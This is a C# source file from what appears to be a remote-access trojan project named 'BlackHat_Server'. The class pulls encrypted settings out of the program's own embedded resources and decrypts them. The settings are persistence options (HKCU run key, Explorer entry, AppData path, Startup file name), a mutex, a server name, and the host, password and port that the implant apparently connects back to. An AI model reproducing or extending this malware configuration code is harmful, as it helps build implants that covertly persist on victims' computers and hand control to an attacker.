using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using BlackHat_Server.Class.Crypt;

namespace BlackHat_Server.Class
{
    internal class ResUtile
    {
        //PINVOKE
        [DllImport("kernel32", CharSet = CharSet.Unicode)]
        private static extern IntPtr BeginUpdateResource(string pFileName, bool
            bDeleteExistingResources);

        [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool UpdateResource(IntPtr hUpdate,
            StringBuilder lpType, StringBuilder lpName, int
                wLanguage, byte[] lpData, int cbData);

        [DllImport("kernel32", SetLastError = true)]
        private static extern int EndUpdateResource(IntPtr hUpdate, bool fDiscard);
        //PINVOKE

        // LOAD PINVOKE
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

        [DllImport("Kernel32.dll", EntryPoint = "LockResource")]
        private static extern IntPtr LockResource(IntPtr hGlobal);

        //  [DllImport("kernel32.dll")]
        //  static extern IntPtr FindResource(IntPtr hModule, int lpID, string lpType);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

        // AGGIUNTA IO !!
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);

        // LOAD PINVOKE


        /// <summary>
        ///     Extract string from Res
        /// </summary>
        /// <param name="filename"></param>
        /// <param name="outfile"></param>
        private string GetResString(string filename, string nomeRisorsa)
        {
            try
            {
                var hMod = LoadLibraryEx(filename, IntPtr.Zero, 0x00000002);

                var hRes = FindResource(hMod, nomeRisorsa, "FILE INFO");
                var size = SizeofResource(hMod, hRes);
                var pt = LoadResource(hMod, hRes);

                var bPtr = new byte[size];
                Marshal.Copy(pt, bPtr, 0, (int) size);

                var enc = new ASCIIEncoding();
                var str = enc.GetString(bPtr);

                return str;
            }
            catch
            {
                return null;
            }
        }
        //************************************************************


        //*************************************************************

        #region PUBLIC

        /// <summary>
        ///     Recupera le info di installazione
        /// </summary>
        /// <param name="useHKCU"></param>
        /// <param name="useExplorer"></param>
        /// <param name="appDataPath"></param>
        /// <param name="useStartup"></param>
        /// <param name="startUpFileName"></param>
        public bool GetInstallInfo(out bool useHKCU, out bool useExplorer, out string appDataPath, out bool useStartup,
            out string startUpFileName,
            out string hkcuEntry, out string exploEntry)
        {
            try
            {
                var info = GetResString(Application.ExecutablePath, "IS");

                var td = new Text_Des();

                info = td.Decrypt(info, true);

                // PARSING DELLE INFO
                var parsed = info.Split('|');


                useHKCU = bool.Parse(parsed[0]);
                hkcuEntry = parsed[1];
                useExplorer = bool.Parse(parsed[2]);
                exploEntry = parsed[3];
                appDataPath = parsed[4];
                useStartup = bool.Parse(parsed[5]);
                startUpFileName = parsed[6];


                return true;
            }
            catch
            {
                useHKCU = false;
                useExplorer = false;
                appDataPath = null;
                useStartup = false;
                startUpFileName = null;
                hkcuEntry = null;
                exploEntry = null;

                return false;
            }
        }


        /// <summary>
        ///     Recupera il MUTEX
        ///     Res Name = MTX
        ///     Null in caso di errore
        /// </summary>
        /// <returns></returns>
        public string GetServerMutex()
        {
            try
            {
                var name = GetResString(Application.ExecutablePath, "MTX");

                var td = new Text_Des();

                name = td.Decrypt(name, true);

                return name;
            }
            catch
            {
                return null;
            }
        }
        //-------------------------------------

        /// <summary>
        ///     Recupera il nome del server
        ///     Res Name = SN
        ///     Null in caso di errore
        /// </summary>
        /// <returns></returns>
        public string GetServerName()
        {
            try
            {
                var name = GetResString(Application.ExecutablePath, "SN");

                var td = new Text_Des();

                name = td.Decrypt(name, true);

                return name;
            }
            catch
            {
                return null;
            }
        }
        //-------------------------------------


        /// <summary>
        ///     Recupera l'host dalle risorse
        ///     Res Name = H
        ///     Null in caso di errore
        /// </summary>
        /// <returns></returns>
        public string GetHost()
        {
            try
            {
                var host = GetResString(Application.ExecutablePath, "H");

                var td = new Text_Des();

                host = td.Decrypt(host, true);

                return host;
            }
            catch
            {
                return null;
            }
        }
        //-------------------------------------

        /// <summary>
        ///     Recupera password dalle risorse
        ///     Res Name = PS
        ///     Null in caso di errore
        /// </summary>
        /// <returns></returns>
        public string GetPsw()
        {
            try
            {
                var psw = GetResString(Application.ExecutablePath, "PS");

                var td = new Text_Des();

                psw = td.Decrypt(psw, true);

                return psw;
            }
            catch
            {
                return null;
            }
        }
        //-------------------------------------

        /// <summary>
        ///     Recupera Porta dalle risorse
        ///     Res Name = PP
        ///     -1 in caso di errore
        /// </summary>
        /// <returns></returns>
        public int GetPort()
        {
            try
            {
                var port = GetResString(Application.ExecutablePath, "PP");

                var td = new Text_Des();

                port = td.Decrypt(port, true);

                int iPort;

                var isInt = int.TryParse(port, out iPort);

                if (isInt)
                    return iPort;
                return -1;
            }
            catch
            {
                return -1;
            }
        }
        //-------------------------------------

        #endregion
    }
}